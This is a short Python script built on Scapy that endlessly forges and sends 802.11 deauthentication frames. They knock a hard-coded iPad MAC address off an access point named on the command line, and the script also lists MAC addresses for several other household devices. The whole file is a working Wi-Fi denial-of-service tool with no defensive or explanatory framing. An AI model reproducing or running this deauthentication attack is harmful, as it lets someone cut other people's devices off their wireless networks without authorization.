# Supress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import random, string, sys
from scapy.all import *

while True:

	broadcast = ":".join(["ff"]*6)
	#bssid = "24:0D:C2:81:D5:A2"
	
	router = "68:B6:FC:B2:75:18"
	toshiba = "4C:BB:58:7D:02:8B"
	acer = "94:E9:79:E3:FF:35"
	iphone = "58:E2:8F:20:7B:6D"
	ipad = "C8:B5:B7:1F:3A:79"

	target_ap = sys.argv[2]
	print("Deauthing %s from %s AP" % (ipad,target_ap))

	radioTapHeader = RadioTap()
	dot11Header = Dot11(addr1 = ipad, addr2 = target_ap, addr3 = target_ap)
	dot11Deauth = Dot11Deauth(reason=7)

	pkt = radioTapHeader / dot11Header / dot11Deauth
    
	sendp(pkt, iface=sys.argv[1], count=100)

